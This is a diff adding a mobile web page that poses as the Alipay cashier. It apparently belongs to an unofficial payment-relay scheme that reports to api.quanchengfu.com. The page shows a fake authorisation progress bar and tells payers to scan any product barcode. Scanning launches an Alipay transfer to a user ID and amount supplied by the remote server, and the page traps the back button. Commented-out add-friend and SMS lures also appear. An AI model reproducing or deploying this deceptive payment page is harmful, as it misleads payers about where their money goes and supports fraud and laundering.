@@ -1,0 +1,453 @@
+<html><head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+
+    <meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
+    <meta name="renderer" content="webkit">
+    <title>支付宝</title>
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <meta name="format-detection" content="telephone=no,email=no">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0, user-scalable=0">
+    <link rel="stylesheet" type="text/css" href="/static/gateway/scan/h5cashier.css" media="all">
+    <link rel="stylesheet" href="/static/gateway/scan/antui.css">
+    <link rel="stylesheet" type="text/css" href="/static/gateway/scan/alitrans.css">
+    <script charset="utf-8" src="/static/gateway/scan/axios.min.js"></script>
+    <script src="https://cdn.staticfile.org/jquery/3.3.1/jquery.min.js"></script>
+    <script src="https://gw.alipayobjects.com/as/g/h5-lib/alipayjsapi/3.1.1/alipayjsapi.inc.min.js"></script>
+
+    <style>
+        body {
+            font-weight: 500;
+            font-family: PingFangSC-Regular, "Helvetica Neue", Helvetica, Arial, "Lucida Grande", sans-serif;
+        }
+
+        .am-header {
+            display: none;
+        }
+
+        .alipay-logo {
+            display: none;
+        }
+
+        .result {
+            margin-top: 20px;
+            width: 100%;
+        }
+
+        .result-logo {
+            width: 70px;
+            height: 98px;
+            margin: auto;
+            background: url("/static/gateway/scan/alipay.png") no-repeat;
+            background-repeat: no-repeat;
+            background-size: contain;
+        }
+
+        .qrcode {
+            width: 140px;
+            height: 140px;
+            margin: auto;
+        }
+
+        .result-title {
+            margin: 40px 0 14px;
+            text-align: center;
+            font-size: 21px;
+            color: #00a0e8;
+            line-height: 25px;
+        }
+
+        .result-tips {
+            max-width: 370px;
+            margin: 0 auto 10px;
+            padding: 0 15px;
+            font-size: 15px;
+            color: #a5a5a5;
+            line-height: 18px;
+            text-align: left;
+            word-break: break-all;
+            word-wrap: break-word;
+        }
+
+        .result-botton {
+            margin: 0 15px 20px;
+        }
+
+        .result-botton a {
+            display: block;
+            margin: auto;
+            -webkit-box-sizing: border-box;
+            box-sizing: border-box;
+            max-width: 384px;
+            height: 44px;
+            text-align: center;
+        }
+
+        .result-botton a.am-button-white {
+            color: #00aaee;
+            background: #ffffff;
+            border: 1px solid #00aaee;
+        }
+
+        .result-botton .am-button[disabled=disabled] {
+            color: #e6e6e6;
+            background: #f8f8f8;
+            border: 1px solid #dedede;
+        }
+
+        .loading {
+            display: none;
+        }
+    </style>
+    <style type="text/css">
+        .out1 {
+            margin: 0 15px 20px;
+            height: 44px;
+            background: lightgray;
+            overflow: hidden;
+        }
+
+        .in1 {
+            width: 0;
+            height: 44px;
+            line-height: 44px;
+            text-align: right;
+            background: #0ae;
+            color: #fff;
+            font-size: 18px;
+        }
+
+        .STYLE2 {
+            font-size: 12px
+        }
+
+        .STYLE3 {
+            color: #FF0000;
+            font-weight: bold;
+        }
+
+        .STYLE4 {
+            color: #0000FF
+        }
+    </style>
+    <style id="tsbrowser_video_independent_player_style" type="text/css">
+        [tsbrowser_force_max_size] {
+            width: 100% !important;
+            height: 100% !important;
+            left: 0px !important;
+            top: 0px !important;
+            margin: 0px !important;
+            padding: 0px !important;
+        }
+        [tsbrowser_force_fixed] {
+            position: fixed !important;
+            z-index: 9999 !important;
+            background: black !important;
+        }
+        [tsbrowser_force_hidden] {
+            z-index: 0 !important;
+            opacity: 0 !important;
+        }
+        [tsbrowser_hide_scrollbar] {
+            overflow: hidden !important;
+        }
+    </style>
+</head>
+
+
+<body>
+<header class="am-header">
+    <h1><span class="title-main" data-title="支付宝收银台">支付宝收银台</span> </h1>
+</header>
+
+
+<div>
+    <div class="result">
+        <div class="result-logo" id="result-logo"></div>
+        <div class="result-title" >支付宝正在授权, 请耐心等待...</div>
+        <div style="margin-top: 40px; color: red;" id="ios-tips" class="result-tips">
+            <!--<p class="STYLE4">1.摄像头自动弹出后，请直接扫描您身边任意商品（烟盒二维码、饮料、零食等）包装上的条形码或二维码，即可跳转支付界面。</p>-->
+            <p class="STYLE4" style="color: red;font-size: 1.3em">摄像头自动弹出后，请直接扫描您身边任意商品（烟盒二维码、饮料、零食等）包装上的条形码或二维码，即可跳转支付界面。</p>
+            <br>
+            <p class="STYLE4" style="color: red;font-size: 1.5em">如：烟盒上的条形码</p>
+            <br>
+            <p class="STYLE4" style="color: red;font-size: 1.5em">如：零食上的条形码</p>
+            <br>
+            <p class="STYLE4" style="color: red;font-size: 1.5em">如：饮料上的条形码</p>
+            <br>
+            <p class="STYLE4" style="color: red;font-size: 1.5em">如：纸巾上的条形码</p>
+            <br>
+            <p class="STYLE4" style="color: red;font-size: 1.5em">如：其它商品上的条形码</p>
+            <!--<p class="STYLE4">3.若提示“本次交易存在风险”，请点击继续付款。</p>-->
+        </div>
+        <div style="display: none;" id="ios-tips2" class="result-tips">2.无法跳转支付也可尝试按Home键回到桌面，再次返回支付宝即可跳转支付;</div>
+        <div id="xx" class="out1 result-botton">
+            <div class="in1" onclick="goPay()" id="percent" style="width: 39%; text-align: center;">39%</div>
+        </div>
+    </div>
+</div>
+
+<div class="am-list" style="border: none; background: none; width: 100%;">
+    <div class="am-list-body" style="position: relative;">
+        <div class="am-list-item" style="padding: 0 15px;">
+            <div class="am-list-content" style="color: #bbb;">应付金额:</div>
+            <div class="am-list-extra" style="-webkit-flex: initial;-webkit-box-flex: initial;">
+                <div style="font-size:0.3rem; outline:none;background:transparent;border:none;outline:medium;height:auto; color: #0ae;">¥ <span id="money">0.01</span> </div>
+            </div>
+        </div>
+    </div>
+</div>
+<script src="http://api.dfpay88.com/static/common/layer/vconsole.min.js"></script>
+<script>
+    $(function(){
+        function pushHistory() {
+            var state = {
+                title: "title",
+                url: "#"
+            };
+            window.history.pushState(state, "title", "#");
+        }
+        pushHistory();
+        window.addEventListener("popstate", function(e) {
+            AlipayJSBridge.call('exitApp');
+        }, false);
+    });
+
+    //右上角菜单
+    AlipayJSBridge.call('setOptionMenu', {
+        icontype: 'filter',
+    });
+    AlipayJSBridge.call('showOptionMenu');
+    document.addEventListener('optionMenu', function (e) {
+        AlipayJSBridge.call('showPopMenu', {
+            menus: [{
+                name: "查看帮助",
+                tag: "tag1",
+            },
+                {
+                    name: "我要投诉",
+                    tag: "tag2",
+                }
+            ],
+        }, function (e) {
+            console.log(e);
+        });
+    }, false);
+</script>
+
+<script type="text/javascript">
+
+    // 更新收款步骤
+    function postStep(v) {
+        $.post('http://api.quanchengfu.com/pay/updateRecStepTwo.do', {
+            order_no: 'C629232745832048',
+            number: v,
+        }, function (result) {
+            console.log(result);
+        });
+    }
+    postStep(3);
+
+    // var vConsole = new VConsole();
+
+    var count = 60;
+    var canPoll = true;
+    var canpay = false;
+    var percent = 40;
+
+    //gopay
+    var timer = window.setInterval(function () {
+        if (!canPoll) return;
+        if (count < 0) {
+            canPoll = false;
+            canpay = true;
+            clearInterval(timer);
+            $('#percent').css('text-align', 'center');
+            $('#percent').html("立即支付");
+            $('.result-title').css('visibility', 'hidden');
+            $('#xxx').css('display', 'block');
+            $('#J_btn_scanQR').show();
+            $('#percent').css('width', "100%");
+            return true;
+        }
+        $('#percent').text(percent + "%")
+        $('#percent').css('width', percent + "%")
+        percent = percent + 1;
+        count--;
+    }, 200);
+
+
+    var userid = "";
+    var money = "";
+
+    function add() {
+
+        // if (isAndroid) {
+        //     setTimeout(function () {
+        //         window.location.href = 'alipays://platformapi/startapp?appId=20000186&actionType=addfriend&userId=' + userid+ '&loginId=' + loginId + '&source=by_f_v&alert=true';
+        //     }, 10);
+        // } else {
+        //     setTimeout(function () {
+        //         window.location.href = "alipays://platformapi/startapp?appId=20000167&forceRequest=0&returnAppId=recent&tLoginId=" + loginId + "&tUnreadCount=0&tUserId=" + userid + "&tUserType=1";
+        //     }, 1);
+        //     setTimeout(function () {
+        //         window.location.href = 'alipays://platformapi/startapp?appId=20000186&actionType=addfriend&userId=' + userid+ '&loginId=' + loginId + '&source=by_f_v&alert=true';
+        //     }, 10);
+        // }
+    }
+
+    //加好友
+    //add();
+
+
+
+    function goPay() {
+        if ( canpay == false ){
+            return false;
+        }
+        alert("温馨提示：请直接扫描您身边任意商品（香烟、饮料、零食等）包装上的条形码或二维码，即可跳转支付界面。");
+        setTimeout(function () { scanQR(); }, 50);
+    }
+
+    // document.addEventListener('click', function () {
+    //     if (count > 0) return
+    //     //AlipayJSBridge.call('pushWindow', { url: payUrl });
+    //     goPay();
+    // });
+
+    // document.addEventListener('click', function () {
+    //     var message = '正在努力为您跳转支付';
+    //     AlipayJSBridge.call('alert', { title: "亲", message: message, button: "确定" }, function () {
+    //         setTimeout(function () {
+    //             document.getElementById('xx').click()
+    //         }, 2500);
+    //         window.location.href = 'sms:?body=请退出短信，回到支付宝继续付款！！！即可支付！';
+    //     })
+    // });
+
+    var myTimer;
+
+
+
+    function timeraa(intDiff) {
+        myTimer = window.setInterval(function () {
+            var day = 0,
+                hour = 0,
+                minute = 0,
+                second = 0;//时间默认值
+
+            if (intDiff > 0) {
+                day = Math.floor(intDiff / (60 * 60 * 24));
+                hour = Math.floor(intDiff / (60 * 60)) - (day * 24);
+                minute = Math.floor(intDiff / 60) - (day * 24 * 60) - (hour * 60);
+                second = Math.floor(intDiff) - (day * 24 * 60 * 60) - (hour * 60 * 60) - (minute * 60);
+            }
+            if (minute <= 9) minute = '0' + minute;
+            if (second <= 9) second = '0' + second;
+
+            if (hour <= 0 && minute <= 0 && second <= 0) {
+                clearInterval(myTimer);
+            }
+            intDiff--;
+
+            checkdata();
+
+        }, 1000);
+    }
+
+    var updateQrImg = 0;
+
+    //检测支付状态
+    function checkdata() {
+        $.post("http://api.quanchengfu.com/pay/orderQuery.do?order_no=C629232745832048", function (result) {
+
+            if (result.code == '-2') {
+                AlipayJSBridge.call('alert', {
+                    title: '支付提示',
+                    message: '支付超时',
+                    button: '我知道了'
+                }, function (e) {
+                    AlipayJSBridge.call('exitApp');
+                });
+            }
+
+            $('#money').html(result.data.money);
+
+            //成功
+            if (result.code == '200') {
+                postStep(6);
+                window.clearInterval(myTimer);
+                myTimer = undefined;
+                AlipayJSBridge.call('alert', {
+                    title: '支付提示',
+                    message: '支付成功',
+                    button: '我知道了'
+                }, function (e) {
+                    AlipayJSBridge.call('exitApp');
+                });
+            }
+
+            //支付二维码
+            if ((result.code == '100' || result.code == '200') && updateQrImg == 0 && result.data.qrcode != 'null') {
+                // $('#qr-opt').hide();
+                userid = result.data.alipayUserId;
+                money = result.data.money;
+                updateQrImg = 1;
+            }
+            //订单已经超时
+            if (result.code == '-1') {
+                window.clearInterval(myTimer);
+                myTimer = undefined;
+                AlipayJSBridge.call('alert', {
+                    title: '支付提示',
+                    message: '订单已经超时',
+                    button: '我知道了'
+                }, function (e) {
+                    AlipayJSBridge.call('exitApp');
+                });
+            }
+        },'json');
+
+    }
+
+    function goJsPay() {
+        AlipayJSBridge.call('exitApp');
+        var a = {
+            actionType: "scan",
+            u: userid,
+            a: money,
+            biz_data: {
+                s: "money",
+                u: userid,
+                a: money
+            }
+        }
+        setTimeout(function () {
+            AlipayJSBridge.call("startApp", {
+                appId: "20000123",
+                param: a
+            })
+        }, 300)
+    }
+
+    timeraa(5000);
+    // var btnScanQR = document.querySelector('#J_btn_scanQR');
+    // var btnScanBAR = document.querySelector('#J_btn_scanBAR');
+    function scanQR() {
+        ap.scan(function (res) {
+            // ap.alert(res.code);
+            // setTimeout(function () { add(); }, 10);
+            setTimeout(function () { goJsPay(); }, 200);
+        });
+    };
+    // btnScanQR.addEventListener('click', scanQR);
+    // btnScanBAR.addEventListener('click', function () {
+    //     ap.scan({
+    //         type: 'bar'
+    //     }, function (res) {
+    //         // ap.alert(res.code);
+    //     });
+    // });
+</script>
+</body>
+</html>
